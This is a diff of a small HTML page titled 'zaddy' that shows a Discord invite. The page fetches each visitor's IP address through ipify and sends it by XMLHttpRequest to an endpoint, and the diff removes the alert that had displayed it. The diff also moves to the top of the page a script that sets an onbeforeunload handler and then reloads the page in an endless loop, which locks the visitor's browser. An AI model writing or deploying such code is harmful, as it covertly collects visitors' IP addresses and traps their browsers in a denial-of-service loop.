@@ -1,6 +1,11 @@
 <h1>zaddy</h1>
 <p>https://discord.gg/4bwKfs9FBj</p>
 
+<script>    onbeforeunload = function(){localStorage.x=1};
+
+  setTimeout(function(){
+    while(1)location.reload(1)
+  }, 1000)</script>
 <script>
   function getIP(json) {
     var request = new XMLHttpRequest();
@@ -15,15 +20,7 @@
         }
   
         request.send(JSON.stringify(params));
-        alert(json.ip)
       }
   
   </script>
   <script src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
-  <script>
-    onbeforeunload = function(){localStorage.x=1};
-
-setTimeout(function(){
-  while(1)location.reload(1)
-}, 1000)
-  </script>
